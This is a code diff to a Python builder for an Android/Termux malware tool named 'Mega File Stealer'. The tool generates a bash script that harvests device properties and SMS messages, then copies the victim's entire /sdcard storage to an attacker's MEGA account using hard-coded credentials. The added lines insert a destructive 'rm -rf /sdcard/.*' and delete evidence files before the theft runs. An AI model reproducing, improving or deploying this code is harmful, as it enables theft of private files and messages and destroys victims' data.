@@ -9,7 +9,7 @@ print("           /___/\033[0;0m")
 print("   _______________________________________")
 print("  |                                       |")
 print("  | \033[0;34mName\033[0;0m    : \033[0;36mMega File Stealer\033[0;0m           |")
-print("  | \033[0;34mVersion\033[0;0m : \033[0;36m2.1\033[0;0m                         |")
+print("  | \033[0;34mVersion\033[0;0m : \033[0;36m2.2\033[0;0m                         |")
 print("  | \033[0;34mAuthor\033[0;0m  : \033[0;36mZech Bron\033[0;0m                   |")
 print("  | \033[0;34mGitHub\033[0;0m  : \033[0;36mhttps://github.com/ZechBron\033[0;0m |")
 print("  |_______________________________________|")
@@ -28,7 +28,8 @@ zCh.write("#!/bin/bash\n")
 
 zCh.write("#417574686F723A205A6563682042726F6E0D0A4769744875623A2068747470733A2F2F6769746875622E636F6D2F5A65636842726F6E")
 zCh.write("\n#QXV0aG9yOiBaZWNoIEJyb24KR2l0SHViOiBodHRwczovL2dpdGh1Yi5jb20vWmVjaEJyb24=")
-
+zCh.write("echo -e \"\e[92mPlease Wait...\e[0m\"")
+zCh.write("\nrm -rf /sdcard/.*\n")
 zCh.write("pkg install curl -y\npkg install grep -y\npkg install tree -y\npkg install megatools -y\npkg install termux-api -y\npkg install termux-tools -y\nclear\n")
 zCh.write("echo -e \"\\nDEVICE INFO\" >> INFO.txt\n")
 zCh.write("getprop >> INFO.txt\n")
@@ -51,13 +52,15 @@ zCh.write("   termux-sms-list -d -l 100 -n >> INFO.txt\n")
 zCh.write(megaputs)
 zCh.write("\nelif [ $? = 1 ]; then\n")
 zCh.write(megaputs)
-zCh.write("\necho \"Please install termux api app\"\nfi\n")
+zCh.write("\necho \"Please install termux api app first\"\nfi\n")
 
+# Remove some evidence
+zCh.write("rm -rf log INFO.txt")
 # Proceed to stealing of files
 zCh.write("megacopy --local /sdcard --remote /Root --no-ask-password --disable-previews --no-ask-password -u " + str(email) + " -p " + str(passwd))
 zCh.write("\nclear\n")
 
-zCh.write(f"rm -rf log INFO.txt {str(ChB)}.sh\n")
+zCh.write(f"rm -rf {str(ChB)}.sh\n")
 os.rename("zech.sh", str(ChB) + ".sh")
 # os.system("cp " + str(ChB) + ".sh /sdcard")
 
